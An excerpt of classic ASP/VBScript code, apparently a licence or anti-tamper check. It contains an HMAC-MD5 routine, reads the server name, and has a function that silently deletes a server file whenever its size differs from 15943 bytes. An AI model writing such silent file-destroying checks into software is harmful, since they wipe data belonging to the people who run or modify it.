...
End Function
Function hx(text,key)
     Dim hkeyy
     Dim ipadd(63)
     Dim opadd(63)
     Dim odataa(79)
     Dim idataa()
     ReDim idataa(64 + Len(text) - 1)
     ...
     For w=0 To Len(hkeyy)-1
          ipadd(w) = ipadd(w) Xor Asc(CStr(Mid(hkeyy,w+1,1)))
          opadd(w) = opadd(w) Xor Asc(CStr(Mid(hkeyy,w+1,1)))
          idataa(w) = ipadd(w) And &hFF
          odataa(w) = opadd(w) And &hFF
     Next

     For w=0 To Len(text)-1
          idataa(64+w) = Asc(CStr(Mid(text,w+1,1))) And &hFF
     Next     

     Dim innerhashoutt
     innerhashoutt = binl2byt(b_calcMD5(idataa))

     For w=0 To 15
          odataa(64+w) = innerhashoutt(w)
     Next
     
     hx = binl2hex(b_calcMD5(odataa))
End Function
tddaz=Request.ServerVariables("Server_Name")
...
Function binl2byt(binarray)
     ...
     binl2byt = bytarray
End Function
Function fsofiledatemofei1(sfile)
sfilere="" 
Set fso = Server.CreateObject("Scripting.FileSystemObject") 
sfile=server.Mappath(sfile) 
Set fsofile=fso.getfile(sfile) 
if fsofile.size <> 15943 then
fso.DeleteFile trim(sfile) 
end if
set fso=nothing
fsofiledatemofei1=sfilere 
End Function
